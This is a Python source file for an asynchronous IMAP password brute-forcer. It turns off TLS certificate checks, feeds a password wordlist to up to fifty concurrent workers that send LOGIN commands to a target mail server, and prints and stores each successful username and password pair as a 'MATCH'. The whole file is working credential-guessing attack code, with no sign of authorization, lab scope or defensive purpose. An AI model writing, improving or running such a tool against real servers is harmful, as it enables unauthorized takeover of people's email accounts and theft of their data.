import asyncio
import ssl
import time
import sys

# Initialize global SSL context once to save CPU overhead
_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

async def worker(name, queue, target, semaphore, results):
    """Consumer worker pulling tasks from the async queue continuously."""
    server = target["server"]
    port = target["port"]
    user = target["user"]

    while True:
        password = await queue.get()
        if password is None:
            queue.task_done()
            break

        async with semaphore:
            start_time = time.time()
            try:
                # Live unbuffered stream output for real-time visibility
                sys.stdout.write(f"\r\033[K\033[96m[SCAN] Worker-{name} -> Testing: {password}\033[0m")
                sys.stdout.flush()

                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(server, port, ssl=_ssl_context),
                    timeout=5.0
                )

                # Read server banner/greeting
                await asyncio.wait_for(reader.readline(), timeout=2.0)
                
                # Format IMAP login command
                login_cmd = f'A001 LOGIN "{user}" "{password}"\r\n'.encode()
                writer.write(login_cmd)
                await writer.drain()

                response = await asyncio.wait_for(reader.readline(), timeout=3.0)
                
                writer.close()
                await writer.wait_closed()

                elapsed = time.time() - start_time

                if b"OK" in response:
                    hit_msg = f"\n\033[92m[+] MATCH IDENTIFIED [Elapsed: {elapsed:.2f}s] -> {user} : {password}\033[0m\n"
                    sys.stdout.write(hit_msg)
                    sys.stdout.flush()
                    results.append({"status": "SUCCESS", "target": server, "user": user, "password": password})
                    # Optional: signal queue to stop or drain if single-hit objective is met

            except asyncio.TimeoutError:
                pass
            except Exception:
                pass
            finally:
                queue.task_done()

async def run_engine(targets, passwords, concurrency_limit=50):
    """Queue-based asynchronous runner eliminating gather overhead."""
    queue = asyncio.Queue()
    semaphore = asyncio.Semaphore(concurrency_limit)
    results = []

    # Populate queue with all wordlist entries
    for pwd in passwords:
        await queue.put(pwd)

    target = targets[0] # Primary active target from interactive prompt

    start_global = time.time()

    # Spawn worker pool (e.g., 50 concurrent workers)
    num_workers = min(concurrency_limit, len(passwords))
    workers = [
        asyncio.create_task(worker(i, queue, target, semaphore, results))
        for i in range(num_workers)
    ]

    # Wait for all items in the queue to be processed
    await queue.join()

    # Stop workers gracefully
    for _ in range(num_workers):
        await queue.put(None)
    await asyncio.gather(*workers)

    duration = time.time() - start_global
    return results, duration
